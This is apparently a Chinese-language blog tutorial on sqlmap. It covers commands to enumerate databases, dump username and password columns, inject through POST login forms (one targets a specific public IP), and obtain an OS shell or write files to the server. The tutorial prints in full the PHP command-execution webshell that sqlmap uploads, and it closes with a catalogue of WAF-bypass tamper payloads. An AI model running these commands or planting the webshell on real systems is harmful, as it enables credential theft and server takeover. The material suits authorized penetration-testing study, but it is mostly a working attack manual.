 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--privileges #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--roles  #枚举数据库用户角色</span></span><br></pre></td></tr></table></figure>

<p><strong>基本信息命令</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看所有用户：当当前用户有权限去读取包含所有用户的表的权限时，该命令可以列出所有的管理员用户</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--users</span></span><br><span class="line"></span><br><span class="line"> 查看当前用户：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"></span><br><span class="line"> 查看所有用户的 数据库用户密码：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line"> 获取 shell:</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/BrAmhPs7UnYjp3Q.png" alt="image-20210914193530736"></p>
<p><strong>常用注入命令</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看数据库</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">查看 当前 网站数据库：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-db</span></span><br><span class="line"> </span><br><span class="line"> 获取当前网站数据库用户的名称：</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"> </span><br><span class="line"> 查表</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="comment">--tables</span></span><br><span class="line"> </span><br><span class="line"> 查列</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="comment">--columns</span></span><br><span class="line"> </span><br><span class="line"> 查字段内容</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="operator">-</span>C &quot;username,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>

<p><strong>POST 表单，登录框注入</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">notepad post.txt将post请求复制粘贴过去</span><br><span class="line"></span><br><span class="line">post请求；python sqlmap.py <span class="operator">-</span>r &quot;post.txt(包含有post请求的文件)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-11</span><span class="operator">/</span> <span class="comment">--forms --level=5 --dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径<span class="operator">+</span>文件名.txt  <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--password --batch</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--os-shell</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="comment">--tables</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="comment">--columns</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="operator">-</span>C &quot;字段名（注意：包含所有的）&quot; <span class="comment">--dump</span></span><br><span class="line"> </span><br><span class="line">  python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--priveliges  #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shell</span><br><span class="line">select @@version;  &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;</span><br><span class="line">select @@plugin_dir;  &#x27;/usr/lib/mysql/plugin/&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="17-2-进阶"><a href="#17-2-进阶" class="headerlink" title="17.2 进阶"></a>17.2 进阶</h3><ul>
<li><p><strong>探测等级：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--level 5</span><br><span class="line">--level 2 # HTTP cookie等</span><br><span class="line">--level 3 # HTTP User-Agent/Referer等</span><br></pre></td></tr></table></figure>

<p>一共五个等级，不加 level 时等级为1，等级越高，进行测试的 Payload 越多。会自动破解出 cookie XFF等注入方式。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--is-dba # 当前用户是否是管理员权限，即当前账户是否是数据管理员账户</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/r6X9vWdYTU4zKZ1.png" alt="image-20210914194547728"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--roles # 列出数据库管理员角色</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/cOlnf2PFYtaILp4.png" alt="image-20210914194708971"></p>
<p>查看数据库用户角色，如果当前用户有权限读取包含所有用户的表时，即可列出。该命令仅仅适用于数据库是  Oracle 时。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--referer http://www.baidu.com</span></span><br><span class="line"># sqlmap 可进行伪造 HTTP 中的 Referer 头，当 <span class="comment">--level &gt;=3 时，可使用  referer 欺骗</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--sql-shell # 运行自定义的 sql 语句</span></span><br><span class="line"># 会进入 <span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> 交互，可直接输入 <span class="keyword">sql</span> 语句进行执行</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/NTF4gzJ6BOXkfDh.png" alt="image-20210914195201939"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--os-cmd</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br><span class="line"># 运行任意操作系统命令</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当数据库为MySQL、PostgreSQL或SQLserver且当前用户具有权限使用特定函数时该指令生效，但实现的原理有所不同。</p>
</blockquote>
<blockquote>
<p>数据库为MySQL和PostgreSQL时，sqlmap商户餐一个二进制库，包含用户自定义的函数<code>sys_exec()</code>和<code>sys_eval()</code>这两个函数可以执行系统命令。在Microsoft SQL Server中，sqlmap使用xp_cmdshell存储过程，如果被禁用（2005及以上版本默认禁用），sqlmap会重新启用它，如果不存在则会被创建。</p>
</blockquote>
<blockquote>
<p>–os-shell 参数可以模拟一个真实的Shell，当不能执行多语句时，仍可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言。（要执行改参数，需要有数据库管理员权限，–is-dba为True）</p>
</blockquote>
<p><strong>–os-shell的利用执行条件三个：</strong></p>
<p>（1）网站必须是root权限</p>
<p>（2）攻击者需要知道网站的绝对路径</p>
<p>（3）GPC为off，php主动转义的功能关闭</p>
<p><strong>Sqlmap getshell的条件</strong></p>
<p>1.网站必须是root权限<br>2.知道网站的绝对路径    </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--sql-shell</span></span><br><span class="line"># 进入交互环境 输入</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>常见找绝对路径方法：</strong><br>1.网页报错信息<br>2.Phpinfo，探针<br>3.数据库查询，暴力破解</p>
</blockquote>
<p>3.PHP关闭魔术引号，php主动转义功能关闭</p>
<blockquote>
<p>magic_quotes_gpc=Off</p>
</blockquote>
<p>4.secure_file_priv=值为空：secure_file_priv参数是用来限制LOAD DATA,SELECT…OUTFILE,and LOAD_FILE()传到哪个指定目录的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/14/1l5QK3nSi4gsTJ8.png" alt="image-20210914201258493"></p>
<p>如果是为空，说明MYSQL默认没有secure_file_priv参数，因此在mysql-ini进行添加配置<br>添加语句secure_file_priv= 即可</p>
<p><strong>测试：</strong></p>
<ol>
<li><p>选择网站语言</p>
</li>
<li><p>输入绝对网站路径</p>
<p><img src="https://i.loli.net/2021/09/14/9YVNqXBnvTbx5CI.png" alt="image-20210914201722412"></p>
</li>
<li><p>进入 os-shell&gt; 交互环境</p>
<p>查看网站根目录，发现生成文件</p>
<p><img src="https://i.loli.net/2021/09/14/E7ovFR3PHLxKX29.png" alt="image-20210914201644753"></p>
<p>原理：用into outfile 函数将一个可以用来上传文件的 php 文件写到网站的根目录下</p>
</li>
<li><p>然后利用该上传脚本我们可以上传木马文件，进行访问，蚁剑链接，getshell</p>
<p>sqlmap 会自动利用上传文件上传一个恶意文件，该文件可以用来执行系统命令，并将结果返回，则我们可以在交互环境下，进行命令执行。</p>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="http://www.qishunwang.net/news_show_47793.aspx">http://www.qishunwang.net/news_show_47793.aspx</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p>
<p>该上传文件页面如下：</p>
<p><img src="https://i.loli.net/2021/09/14/L8HBnzFbcZRwMNx.png" alt="image-20210914202116561"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$z</span>=preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,<span class="variable">$z</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">return</span> is_callable(<span class="variable">$n</span>)<span class="keyword">and</span>!in_array(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">&#123;ob_start();</span><br><span class="line">system(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=proc_open(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=fread(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        @proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$x</span>=popen(<span class="variable">$c</span>,r);</span><br><span class="line">            <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span>(is_resource(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(!feof(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="variable">$w</span>.=fread(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    @pclose(<span class="variable">$x</span>);</span><br><span class="line">                    &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">                        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">                        exec(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">                        <span class="variable">$w</span>=join(chr(<span class="number">10</span>),<span class="variable">$w</span>).chr(<span class="number">10</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>.<span class="variable">$w</span>.<span class="string">&quot;&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-read</span></span><br><span class="line"># 从数据库服务器中读取文件</span><br></pre></td></tr></table></figure>

<p>适用于MySQL、PostgreSQL或Microsoft SQL Server且当前用户有权限执行特定的函数时。读取的文件可以是文本可以是二进制文件。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--file-read &quot;路径&quot; -v 1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-write --file-dest</span></span><br><span class="line"># 上传文件到数据库服务器中</span><br><span class="line"></span><br><span class="line"># file<span class="operator">-</span>write  从本地写入</span><br><span class="line"># file<span class="operator">-</span>dest  写入目标路径</span><br></pre></td></tr></table></figure>

<p>数据库：MySQL、PostgreSQL、Microsoft SQL Server<br>且：当前用户有权限使用特定的函数时。可以上传文本文件或二进制文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=本地文件路径 --file-dest 网站路径(写入路径)+&quot;/写入的文件名&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx</span></span><br></pre></td></tr></table></figure>

<h3 id="17-3-–tamper"><a href="#17-3-–tamper" class="headerlink" title="17.3 –tamper"></a>17.3 –tamper</h3><p>sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p>
<p>绕过脚本目录在 <code>sqlmap/tamper</code>，目前官方提供 53 个绕过脚本</p>
<p><img src="https://i.loli.net/2021/09/14/yh6FDGfeZTlOcqn.png" alt="image-20210914203704034"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url] <span class="comment">--tamper [模块名]</span></span><br></pre></td></tr></table></figure>

<p>可以使用–identify-waf对一些网站是否有安全防护进行试探</p>
<p>0x02 常用tamper脚本<br>apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
<p>base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p>
<p>multiplespaces.py<br>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p>
<p>space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
<p>nonrecursivereplacement.py<br>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>
<p>space2randomblank.py<br>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>
<p>unionalltounion.py<br>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION SELECT</p>
<p>securesphere.py<br>适用数据库：ALL<br>作用：追加特定的字符串<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p>
<p>space2dash.py<br>适用数据库：ALL<br>作用：将空格替换为–，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p>
<p>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Eid%0DFROM%07users</p>
<p>between.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：用NOT BETWEEN 0 AND #替换&gt;<br>使用脚本前：tamper(‘1 AND A &gt; B–’)<br>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p>
<p>percentage.py<br>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br>作用：在每个字符前添加一个%<br>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>
<p>sp_password.py<br>适用数据库：MSSQL<br>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br>使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br>使用脚本后：1 AND 9227=9227– sp_password</p>
<p>charencode.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>
<p>randomcase.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：随机大小写<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：INseRt</p>
<p>charunicodeencode.py<br>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br>作用：适用字符串的unicode编码<br>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>
<p>space2comment.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将空格替换为/<strong>/<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p>
<p>equaltolike.py<br>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br>作用：将=替换为LIKE<br>使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>
<p>equaltolike.py<br>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br>使用脚本前：tamper(‘1 AND A &gt; B’)<br>使用脚本后：1 AND GREATEST(A,B+1)=A</p>
<p>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5<br>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br>使用脚本前：tamper(‘IFNULL(1, 2)’)<br>使用脚本后：IF(ISNULL(1),2,1)</p>
<p>modsecurityversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：过滤空格，使用mysql内联注释的方式进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p>
<p>space2mysqlblank.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1<br>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>
<p>modsecurityzeroversioned.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0<br>作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br>使用脚本前：tamper(‘1 AND 2&gt;1–’)<br>使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p>
<p>space2mysqldash.py<br>适用数据库：MySQL、MSSQL<br>作用：将空格替换为 – ，并追随一个换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1–%0AAND–%0A9227=9227</p>
